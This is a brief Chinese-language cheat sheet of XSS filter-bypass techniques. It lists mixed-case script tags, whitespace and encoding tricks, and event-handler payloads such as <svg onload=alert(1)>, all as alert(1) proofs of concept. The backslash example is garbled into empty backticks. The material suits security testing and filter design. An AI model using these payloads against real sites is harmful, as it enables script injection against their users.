### XSS 绕过方式

**1. 大小写混淆绕过**

许多过滤规则是针对特定大小写模式的，比如 `<script>`。你可以尝试使用大小写混淆的方式来绕过，例如：

- `<sCrIpT>`
- `<ScrIpT>`
- `<SCript>`

这种方式通常在不区分大小写的环境中有效

**2. 空白字符、换行符和 Tab 键绕过**

过滤器有时会忽略或者处理不当某些空白字符。你可以尝试在标签、属性名或者属性值之间插入空格、换行符（`%0a`或`%0d`）或者 Tab 键（`%09`）来绕过，例如：

- `<img src="javascript:alert(1);">` 可以尝试写成 `<img src=" javascript: alert(1); ">`
- `<script>alert(1)</script>` 可以尝试写成 `<script%0a>alert(1)</script>`

**3. 使用编码绕过**

许多过滤器会试图拦截特定字符，比如尖括号 `< >` 和引号 `"` `'`。你可以使用 HTML 实体编码、URL 编码或者其他编码方式来绕过

- **URL 编码：**
  - `(` 编码为 `%28`
  - `)` 编码为 `%29`
  - ` ` 编码为 `%20`

**4. 标签和属性嵌套绕过**

有些过滤器可能只过滤顶层的脚本标签，但忽略嵌套的标签。你可以尝试在标签内部使用其他标签或者属性来注入，例如：

- `<a href="javascript:alert(1)">Click Me</a>`
- `<img src="x" onerror="alert(1)">`
- `<svg onload=alert(1)>`

**5. 事件处理器绕过**

除了最常见的 `onload` 和 `onerror` 事件，还有很多其他事件可以用来触发脚本，例如：

- `onmouseover`
- `onmouseout`
- `onclick`
- `onfocus`
- `onblur`
- `onchange`

例如：`<input onfocus=alert(1) autofocus>`

**6. 使用特殊字符绕过**

一些特殊字符，如反引号（`）、反斜杠（``）等，在特定情况下可以用来绕过过滤。例如，在某些 JavaScript 语法中，反引号可以用来包裹字符串并执行代码